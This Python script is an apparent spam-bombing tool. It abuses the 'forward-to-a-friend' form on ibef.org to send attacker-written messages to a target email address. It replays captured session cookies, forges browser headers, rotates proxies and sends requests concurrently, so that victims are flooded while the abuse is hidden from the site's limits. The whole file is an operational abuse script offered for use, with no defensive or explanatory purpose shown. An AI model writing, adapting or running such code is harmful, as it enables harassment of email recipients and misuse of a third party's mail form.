from os.path import basename

import requests

import module

cookies = {
    '__utma': '95928516.1213157784.1674741964.1674741964.1674741964.1',
    '__utmc': '95928516',
    '__utmz': '95928516.1674741964.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)',
    '__utmt': '1',
    '__utmb': '95928516.1.10.1674741964',
    'ci_session': 'a0c5a688af3fa0ced308f96da6e3538b04df360e',
}

headers = {
    'authority': 'www.ibef.org',
    'accept': '*/*',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.ibef.org',
    'referer': 'https://www.ibef.org/forward-to-a-friend',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response | None:
        text = self.get_text(target=target)
        data = {
            'friend-name': text,
            'friend-email': target,
            'your-name': text,
            'your-email': target,
            'friend-message': text,
            'newsletter-link': '',
        }

        response = requests.post('https://www.ibef.org/forward-to-a-friend/submission', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies(), timeout=10)
        return response


def main():
    s = '1'

    spam = ConcreteSpam(
        basename(__file__)[:-3], s,
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)


if __name__ == '__main__':
    main()
